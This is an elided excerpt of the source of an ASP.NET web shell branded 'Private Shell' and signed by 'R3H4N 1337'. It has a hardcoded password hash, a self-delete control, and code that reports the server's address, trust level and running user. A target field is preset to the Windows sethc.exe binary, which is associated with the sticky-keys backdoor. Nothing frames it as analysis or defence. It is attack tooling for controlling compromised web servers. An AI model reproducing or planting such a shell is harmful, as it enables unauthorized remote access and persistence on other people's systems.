...
<script runat="server">
	...
	Edited: R3H4N 1337
	*/
	public const string Version="Private Shell - R3H4N 1337";
	public const string Password="d13f0a61e938c1fe08c19e96b68c5f13";
	...
	void IHttpHandler.ProcessRequest(HttpContext context)
	{
		...
		catch(SecurityException ex){context.Response.Clear();context.Response.Write("PrivateShell request low-trust minimum,Exception message: "+ex.Message);}
	...
	private void zcg_SetHeaderInfo()
	{
		...
		Bin_Button_KillMe.Attributes["onClick"]="if(confirm('Are you sure delete Private Shell?')){Bin_PostBack('Bin_KillMe','');};";
		Bin_Span_Sname.InnerHtml="<b><font face=courier size=3>Private Shell</b></font><br><br><b>Server: </b>"+Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"("+Request.ServerVariables["SERVER_NAME"]+")"+zcg_CheckPermission();
		Bin_Span_FrameVersion.InnerHtml="<b>Framework Ver: </b>"+Environment.Version.ToString();
	}
	private string zcg_CheckPermission()
	{
		string s="&nbsp;&nbsp;<br><b>Host Trust Level:</b>&nbsp;&nbsp;<span style='color:red;'>{0}</span>&nbsp;&nbsp;<b><br>IsFull-Trust:</b>&nbsp;&nbsp;<span style='color:red;'>{1}</span>&nbsp;&nbsp;<b><br>User:</b>&nbsp&nbsp;<span style='color:red;'>{2}</span>";
...
<td style="width:20%" align="left">Target : <input id="Bin_TextBox_Target" class="input" runat="server" type="text" style="height:16px" size="40" value="c:\windows\system32\sethc.exe"/>&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button runat="server" 
 ...
 <tr>
	...
	<div id="zcg_div_PluginResult" runat="server"></div>
		...
		<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Edited by R3H4N 1337</div></div>
